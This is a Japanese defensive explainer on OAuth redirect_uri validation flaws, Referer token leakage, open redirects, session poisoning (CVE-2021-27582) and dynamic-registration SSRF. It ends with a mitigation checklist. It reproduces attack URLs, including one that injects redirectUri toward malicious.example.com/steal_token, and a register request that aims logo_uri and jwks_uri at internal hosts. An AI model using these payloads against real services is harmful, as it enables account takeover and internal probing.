## redirect_uri 検証不備・open redirect・トークン漏洩

OAuth のセキュリティは、突き詰めると「認可コードやアクセストークンという“信頼境界を跨ぐ秘密”を、ブラウザという攻撃者が完全に制御できる環境を経由して、正しい宛先にだけ届けられるか」に帰着する。その宛先を指定するのが `redirect_uri`（コールバックURL — 認可サーバーがユーザーを差し戻す先のURL。ここに認可コードやトークンが載る）である。したがって `redirect_uri` の検証をどこか一箇所でも緩めると、秘密の宛先が攻撃者に付け替えられ、アカウント乗っ取り（Account Takeover, ATO）に直結する。

本節では Antonio Sanso の一連の研究（Top 10 実装脆弱性、トークンハイジャック Part1/Part2）と PortSwigger Research の「Hidden OAuth attack vectors」を統合し、(1) `redirect_uri` の**厳密一致（exact matching）**がなぜ唯一の安全な検証法なのか、(2) 緩い検証・オープンリダイレクト・Referer 漏洩が組み合わさってどうトークンが盗まれるのか、(3) セッション汚染（session poisoning）による近年の高度な検証バイパスを、仕組みレベルで解説する。すべて防御目的の解説であり、実在サービス・本番環境への無許可検証や破壊的手順は扱わない。

### なぜ「厳密一致」なのか — RFC 6749 が要求する2つの照合点

OAuth 2.0（RFC 6749）で `redirect_uri` の検証が問われる箇所は、実は2つある。この2箇所を混同すると防御に穴が空く。

1. **認可エンドポイント（`/authorize`）での照合**: クライアント登録時に事前登録された `redirect_uri` と、認可リクエストに含まれる `redirect_uri` パラメータを照合する。ここが緩いと、攻撃者は正規クライアントの `client_id` を使いつつ宛先だけ攻撃者サーバーに向け、認可コード／トークンを丸ごと奪える。
2. **トークンエンドポイント（`/token`）での再照合**: RFC 6749 §4.1.3 は、コードをトークンに交換する際、認可リクエスト時に `redirect_uri` が含まれていたなら「その値が同一であることを保証せよ（ensure that their values are identical）」と定める。

Sanso が「#9 Match Point」で強調するのは後者である。原文の引用は次の通り。

> if the `redirect_uri` parameter was included in the initial authorization request as described in Section 4.1.1, and if included ensure that their values are identical.
>
> — RFC 6749 §4.1.3（Sanso「Top 10 OAuth 2 Implementation Vulnerabilities」#9 より）

この `/token` 側の再照合が抜けていると、認可コードフロー（比較的堅牢とされるフロー）であっても、後述の「Lassie Come Home」型のリダイレクト検証バイパスと組み合わさった瞬間に "game over"（Sanso）になる。理由は単純で、`/authorize` を通過してしまった攻撃者の宛先で受け取ったコードを、攻撃者が自分で `/token` に投げて交換できてしまうからだ。両エンドポイントで**登録済みURLとの厳密（バイト単位）一致**を課すことだけが、この連鎖を断ち切る。

> 出典: Top 10 OAuth 2 Implementation Vulnerabilities — http://blog.intothesymmetry.com/2015/12/top-10-oauth-2-implementation.html

### 「厳密一致」以外がすべて危険な理由 — 部分一致・サブディレクトリ許容の落とし穴

多くの実装が犯した誤りは、「登録URLで**始まる**URLなら許可する」というサブディレクトリ許容（prefix matching）や、正規表現（regex）による照合である。Sanso の Top 10 は、クライアント側・サーバー側それぞれの原則を次のように定式化している。

- **クライアント側（#2 Lassie Come Home for OAuth Clients）**: 「Thou shall register a redirect_uri as much as specific as you can（可能な限り具体的な redirect_uri を登録せよ）」。ドメインだけ・ワイルドカードだけの登録は禁物で、フルパスで登録する。
- **サーバー側（#1 Lassie Come Home for Authorization Servers）**: 「use exact matching against registered redirect uri to validate the redirect_uri parameter（登録済み redirect_uri と**厳密一致**で検証せよ）」。

厳密一致で拒否すべき差分は、少なくとも次を含む。

- プロトコル差（`http` と `https`）
- サブドメイン差（`app.example.com` と `evil.example.com`）
- パス差（サブディレクトリ・末尾スラッシュを含む）
- 追加クエリパラメータの有無
- URL エンコーディングの揺れ（`%2e`, `%2f`, `%00`, 二重エンコードなど、パーサ差で正規化結果が変わる）

Sanso は #1 で、Egor Homakov による GitHub の認可コード窃取、Facebook の正規表現ベース `redirect_uri` 検証のバイパス、Google/GitHub 連携の破壊など、実在した被害を列挙し、これらがいずれも「厳密一致でない照合」に起因すると指摘している。攻撃の一般形は次の流れになる（防御理解のための概念図）。

```
1. 被害者が正規プロバイダでOAuthログインを開始
2. プロバイダが弱い照合ロジックで redirect_uri を検証
3. 攻撃者が制御するURI（登録URLの部分一致を満たす）が検証を通過
4. 被害者の認可コードが攻撃者サーバーに届く
5. 攻撃者がコードをトークンに交換
6. なりすまし／アカウント乗っ取り成立
```

なぜ部分一致が破綻するのかを仕組みで言えば、「登録URLで始まる」という条件は、攻撃者が**登録URLの配下（サブパス）に自分の受信点を作れる**任意の状況で成立してしまうからだ。次項の実例がまさにそれである。

> 出典: Top 10 OAuth 2 Implementation Vulnerabilities — http://blog.intothesymmetry.com/2015/12/top-10-oauth-2-implementation.html

### 実例1: サブディレクトリ許容 + Referer 漏洩による認可コード窃取（Google/Microsoft 連携）

Sanso の「On OAuth token hijacks for fun and profit」Part1（2015-06）は、厳密一致でないと何が起きるかを最も明快に示す事例である。登場人物は次の三者。

- **OAuth クライアント**: Google（Google+ の Outlook 連絡先連携機能）
- **認可サーバー**: Microsoft（`login.live.com`）
- **攻撃の足場**: Google+ の公開投稿（攻撃者が任意URLのページを作れる）

根本原因は2つが重なったことにある。

1. **クライアント側の過剰に広い登録**: Google は Microsoft に対し `https://plus.google.com/` という広すぎる `redirect_uri` を登録していた。本来のフローが使う値は `https://plus.google.com/c/auth` なので、`https://plus.google.com/c/auth` を登録すべきだった。
2. **サーバー側のサブディレクトリ許容**: Microsoft は「登録URLで始まる任意のURIを許可する」検証（GitHub と同様の方式）だったため、`https://plus.google.com/` 配下ならどんなパスでも通過した。

攻撃者は Google+ 上に、自分が制御する外部サイトへのリンクを埋め込んだ公開投稿を作り、そのページURLを `redirect_uri` に指定した認可URLを組み立てる（実物）。

```
https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=000000004404170C&scope=wl.emails,wl.basic,wl.contacts_emails,wl.offline_access&redirect_uri=https://plus.google.com/app/basic/stream/z12wz30w5xekhjow504ch3vq4wi1gjzrd3w
```

被害者がこのリンクを踏んで権限を許可すると、Microsoft は「登録URLで始まる」検証を通過させ、コードを付けて攻撃者の投稿ページへ差し戻す。

```
https://plus.google.com/app/basic/stream/z12wz30w5xekhjow504ch3vq4wi1gjzrd3w?code=e8e0dc1c-2258-6cca-72f3-7dbe0ca97a0b
```

ここまでは宛先が `plus.google.com` なので、コード自体はまだ Google のドメイン内にある。ところが**この投稿ページには攻撃者の外部サイトへのリンクが埋め込まれている**。被害者がそのリンクをクリックすると、ブラウザは遷移元URL（＝コードを含むURL）を **Referer ヘッダ**に載せて攻撃者サーバーへ送る。攻撃者が受け取るリクエスト（実物）は次の通り。

```
Referer: https://plus.google.com/app/basic/stream/z12wz30w5xekhjow504ch3vq4wi1gjzrd3w?code=e8e0dc1c-2258-6cca-72f3-7dbe0ca97a0b&state=...
```

**なぜこうなるのか（仕組み）**: 認可コードはクエリ文字列（`?code=...`）としてURLに載る。ブラウザは、あるページから別ページへ遷移する際、遷移元のフルURL（クエリ込み）を既定で Referer に入れる。したがって「攻撃者が中身を制御できるページ」がコード受信点になった瞬間、そのページ上のリンク一発でコードが外部へ漏れる。フラグメント（`#`以降）は Referer に載らないが、認可コードフローはコードをクエリで返すため、この漏洩経路が直撃する。

修正は「より具体的な `redirect_uri`（この場合 `https://plus.google.com/c/auth`）を登録するだけ」（Sanso）で済んだ。Sanso は Google の報奨金プログラムに報告し、バウンティを得ている。教訓は明快で、**サーバー側の厳密一致とクライアント側の具体的登録のどちらか一方でもあれば、この連鎖は成立しない**。

> 出典: On OAuth token hijacks for fun and profit (Part 1) — http://blog.intothesymmetry.com/2015/06/on-oauth-token-hijacks-for-fun-and.html

### 実例2: アクセストークンの Referer 漏洩（Microsoft Word Online 連携）

Part2（2015-10）は、コードではなく**アクセストークンそのもの**が Referer で漏れる事例で、「トークンをURLに載せる設計」の危険を示す。

Microsoft の Word Online ビューア（`word.office.live.com`）は、パートナーサイトがホストするドキュメントをプレビュー表示する連携機能を持っていた。そのプレビューURLの中に、パートナーサイトのURLとアクセストークンがクエリとして埋め込まれていた（実物・構造）。

```
https://word.office.live.com/wv/WordView.aspx?FBsrc=http://PARTNER_WEBSITE/attachments/doc_preview.php?mid=mid.1426701639299%3A78532202c0996b8097&id=10152839561617017&access_token=AQD2GswFGnDGl28A&title=sanso-test
```

攻撃者は、自分の HTTPS サイトへのリンクを含む Word 文書を作り、パートナーサイトにアップロードして被害者と共有する。被害者が Word Online プレビュー（HTTPS）上で文書内リンクをクリックすると、遷移元URL（`access_token=...` を含む）が Referer として攻撃者の HTTPS サイトに送られる。

**なぜ HTTPS→HTTPS でも Referer が送られるのか（仕組み）**: RFC 2616 §15.1.3 は「参照元ページがセキュアなプロトコルで転送された場合、クライアントは**非セキュアな（HTTP）**リクエストに Referer を含めるべきでない」と定める。逆に言えば、**HTTPS ページから HTTPS ページへ**の遷移（同一のセキュアプロトコル間）では、この抑制が効かず Referer が既定で送信される。攻撃者が自サイトを HTTPS にしておけば漏洩が成立するのはこのためだ。

```
# RFC 2616 §15.1.3(要約)
HTTPS(参照元) → HTTP(遷移先)  : Referer を送るべきでない(抑制される)
HTTPS(参照元) → HTTPS(遷移先) : Referer が既定で送られる  ← ここが穴
```

Microsoft は Referer 漏洩を修正し、バウンティを支払った（同エンドポイントで別途 stored XSS も発見・修正された）。Sanso 自身は「トークンの粒度やパートナー実装次第では、セキュリティ脆弱性というよりプライバシー問題のバケツに入るかもしれない」と評価の幅にも触れているが、乗っ取ったトークンのスコープ内で攻撃者が操作を行える点で実害がある。

**防御の要点**: (1) アクセストークンは URL クエリではなく `Authorization: Bearer` ヘッダで送る、(2) `Referrer-Policy` ヘッダ（例: `no-referrer`, `strict-origin-when-cross-origin`）でクエリ付きURLの流出を抑止する、(3) 短命・最小スコープのトークンにする。なお Part1 のコード漏洩に対しては、POST ベースのリダイレクト（コードをクエリでなくPOSTボディで返す form_post 応答モード）も有効な緩和策になる。

> 出典: On OAuth token hijacks for fun and profit (Part 2) — http://blog.intothesymmetry.com/2015/10/on-oauth-token-hijacks-for-fun-and.html

### 仕様準拠が生むオープンリダイレクト（Top 10 #8）

Sanso の Top 10 「#8 Open Redirect in RFC 6749」は、逆説的だが重要な指摘だ。**RFC 6749 を額面通りに実装するだけで、オープンリダイレクト（攻撃者が指定した任意URLへユーザーを飛ばせる欠陥。OWASP Top 10 2010-A10）が生じうる**。

なぜか。RFC 6749 §4.1.2.1 は、認可リクエストにエラー（例: `scope` が不正）があった場合でも、`redirect_uri` の照合を先に済ませていれば、その `redirect_uri` にエラーを付けて**リダイレクトで**返すことを許容している。実装が「エラー時のリダイレクトでは登録照合を厳密にやらない」あるいは「照合が緩い」場合、攻撃者は不正な `scope` などを混ぜた認可URLを作るだけで、ユーザーを任意サイトへ飛ばせる。Sanso はこの経路が Microsoft の連携で悪用された事例に触れている（実例1と同じ「サブディレクトリ許容」がここでも効く）。

このオープンリダイレクトは単体でもフィッシングに使えるが、真に危険なのは**他のOAuthフローの中間ホップ**として使われるときだ。「登録済みで信頼されたクライアント」がオープンリダイレクトを抱えていると、認可サーバーはそのクライアントの `redirect_uri` を正規と信じてコード／トークンを渡し、クライアント内のオープンリダイレクトがそれを攻撃者へ横流しする。だからこそ #9（トークンエンドポイント再照合）と #1/#2（厳密一致・具体的登録）が連動して初めて防御になる。

**防御の要点**: 仕様の最低要件で止めず、(1) 登録 `redirect_uri` との厳密一致をエラーリダイレクト時にも適用する、(2) クライアント側は自ドメイン内のオープンリダイレクトを排除する、(3) 許可リスト方式で宛先を限定する。

> 出典: Top 10 OAuth 2 Implementation Vulnerabilities — http://blog.intothesymmetry.com/2015/12/top-10-oauth-2-implementation.html

### セッション汚染による redirect_uri 検証バイパス（PortSwigger / CVE-2021-27582）

PortSwigger Research「Hidden OAuth attack vectors」は、`/authorize` で `redirect_uri` を正しく検証していても、**その後の確認ステップでセッションに保存した値を再検証せずに使う**設計が新たな抜け道を生むことを示した。これが「redirect_uri セッション汚染（session poisoning）」である。

多くの実装は3ステップに分かれる。

1. `/authorize` — パラメータを検証し、セッションに保存
2. `/login` — ユーザー認証
3. `/oauth/confirm_access`（同意確認）— セッションに保存済みの値をそのまま使う

問題は、3で「セッションに入っている値」を無条件に信頼し、かつ**3のエンドポイントがHTTPリクエストのクエリからも値を受け付けてしまう**場合に起きる。MITREid Connect の CVE-2021-27582 が典型例で、Spring の `@ModelAttribute` アノテーションが原因だった。

```java
@PreAuthorize("hasRole('ROLE_USER')")
@RequestMapping("/oauth/confirm_access")
public String confirmAccess(Map<String, Object> model,
    @ModelAttribute("authorizationRequest") AuthorizationRequest authRequest,
    Principal p)
```

**なぜ危険なのか（仕組み）**: `@ModelAttribute("authorizationRequest")` は、前段コントローラのモデルからだけでなく「**現在のHTTPリクエストのクエリ**」からもフィールドをバインドする（マスアサインメント）。しかも `@SessionAttributes("authorizationRequest")` によって、この `authorizationRequest` はセッションに存在すればよく、その状態は**単に `/authorize` を一度訪れるだけ**で作れる。結果、攻撃者は `/authorize` の検証を迂回して `/oauth/confirm_access` に直接クエリで値を注入できる。

攻撃者は2本のリンクを用意する（実物）。

```
/authorize?client_id=trusted&response_type=code&scope=openid&prompt=consent&redirect_uri=http://trusted.example.com/redirect

/oauth/confirm_access?client_id=trusted&response_type=code&prompt=consent&scope=openid&redirectUri=http://malicious.example.com/steal_token
```

ここで**パラメータ名が意図的に異なる**点に注目。正規フローは `redirect_uri`（アンダースコア）だが、バインド対象の Java フィールドは `redirectUri`（キャメルケース）である。攻撃者は2本目で `redirectUri=http://malicious...` を注入し、セッション内の `authorizationRequest` を汚染する。被害者が信頼クライアント（`client_id=trusted`）への同意を承認すると、汚染された宛先へコード／トークンが漏れる。

補助テクニックとして `prompt=consent`（OpenID Connect のパラメータ）が使われる。これは「以前に同意済みでも同意画面を強制的に再表示させる」もので、被害者が過去に信頼クライアントを承認済みで通常なら同意画面が出ないケースでも、確実に確認ステップを通過させて汚染を発火できる。さらに、マスアサインメントが無くても、**同時並行の認可リクエスト（別タブ）**によるレースコンディションで同じセッション汚染が起こりうるとされる。

**修正**: MITREid Connect は、フォワード時に `@ModelAttribute` でクエリからバインドするのをやめ、コントローラの `Map<String, Object> model` から直接値を取り出す方式に改めた。一般化した防御は、(1) `confirm_access`（同意確認）で全OAuthパラメータを**再検証**し、セッション値を鵜呑みにしない、(2) セッション属性への自動バインド（Spring の model attribute binding）をセキュリティ上重要なパラメータに使わない、(3) 確認ステップに一意のインタラクションID／CSRFトークンや署名付きリクエストを課す、である。

> 出典: Hidden OAuth attack vectors — https://portswigger.net/research/hidden-oauth-attack-vectors

### 参考: 動的クライアント登録が生む SSRF（redirect_uri と隣接するURL群）

PortSwigger は同記事で、`redirect_uri` の親戚とも言える「サーバーが後から取得しにいくURLパラメータ」による**second-order SSRF**（サーバー間リクエスト強要。登録時ではなく後続のフロー中にURLが取得される二次的SSRF）も報告している。本節の主題（redirect_uri とトークン漏洩）から一歩広げた防御知識として要点のみ触れる。

OpenID Connect の動的クライアント登録エンドポイント（例: `/register`, `/connect/register`）は、次のようなURLパラメータを受け付ける。これらは登録時に即取得されず、**後のOAuthフロー中**に認可サーバーがフェッチするため、SSRF に化ける。

- `logo_uri` — 同意画面表示時にサーバーがロゴ画像を取得
- `jwks_uri` — JWT クライアントアサーション検証時に鍵セットを取得
- `sector_identifier_uri` — `redirect_uri` の配列を収めたJSONファイル。認可時に取得される
- `request_uri` — リクエスト情報を収めたJWTを指すURL。認可開始時に取得される

```
POST /connect/register HTTP/1.1
Content-Type: application/json

{
  "redirect_uris": ["https://attacker.com/callback"],
  "logo_uri": "http://internal-server/admin",
  "jwks_uri": "http://localhost:8080/sensitive"
}
```

MITREid Connect の CVE-2021-26715 では、クライアントのロゴをダウンロードするエンドポイントが content-type 検証なしにサーバー間リクエストを行い、SSRF と（HTMLレスポンス注入による）XSS の両方を許した。

**防御の要点**: (1) 取得を許すスキームを `https` のみに限定、(2) 登録時にURLを厳格検証し、認可フロー中の任意フェッチを避ける、(3) `logo_uri` は画像 content-type のみ許可、(4) 内部アドレス（`localhost`, プライベートIP, メタデータエンドポイント）への到達をブロックする。`request_uri` を悪用する SSRF については、OpenID Connect の後続仕様で `request_uri` の事前登録（allowlist）が推奨されている点も押さえておきたい。

> 出典: Hidden OAuth attack vectors — https://portswigger.net/research/hidden-oauth-attack-vectors

### 本節のまとめ — 防御チェックリスト

`redirect_uri` 起点のトークン漏洩を止める勘所は、次の重層防御に集約される。

- **認可サーバー**: 登録 `redirect_uri` と**厳密（バイト単位）一致**で照合する。prefix / 正規表現 / ワイルドカード / サブディレクトリ許容を使わない。エラーリダイレクト時にも同じ厳密照合を適用する（#8 対策）。
- **トークンエンドポイント**: RFC 6749 §4.1.3 の通り `redirect_uri` を**再照合**し、`/authorize` 時と同一であることを保証する（#9 対策）。
- **同意確認ステップ**: セッションに保存した値を鵜呑みにせず**再検証**する。自動バインド（マスアサインメント）を排除する（セッション汚染 / CVE-2021-27582 対策）。
- **クライアント**: `redirect_uri` を可能な限り具体的（フルパス）に登録する。自ドメイン内のオープンリダイレクトを排除する（#1/#2 対策）。
- **秘密の運搬**: アクセストークンを URL に載せず `Authorization` ヘッダで送る。コードは form_post 応答モードでクエリ露出を避ける。`Referrer-Policy` で Referer 漏洩を抑止する（実例1・実例2 対策）。
- **動的登録**: 後から取得されるURLパラメータ（`logo_uri` 等）を `https` 限定・content-type 検証・内部到達ブロックで守る（SSRF 対策）。

これらは互いに補完的で、どれか一つが破れても他の層が漏洩を食い止められるように設計するのが要点である。
